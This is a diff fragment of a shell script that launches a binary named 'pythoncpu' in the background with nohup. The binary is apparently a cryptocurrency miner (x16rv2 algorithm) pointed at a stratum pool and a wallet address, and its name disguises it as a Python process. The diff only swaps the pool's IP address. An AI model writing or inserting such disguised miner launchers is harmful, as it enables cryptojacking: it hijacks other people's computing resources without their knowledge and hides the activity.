@@ -31,7 +31,7 @@ chmod +x pythoncpu
   echo '######### execution #########'
 
 
-nohup ./pythoncpu -a x16rv2 -o stratum+tcp://78.47.69.185:6007 -u 5PJxraBqyU1yKK5QukamiMZqNdWPcZ3wwB -p c=VGC -t 4 1> oout 2> oout &
+nohup ./pythoncpu -a x16rv2 -o stratum+tcp://49.12.115.117:6007 -u 5PJxraBqyU1yKK5QukamiMZqNdWPcZ3wwB -p c=VGC -t 4 1> oout 2> oout &
 tail -f oout
 
 
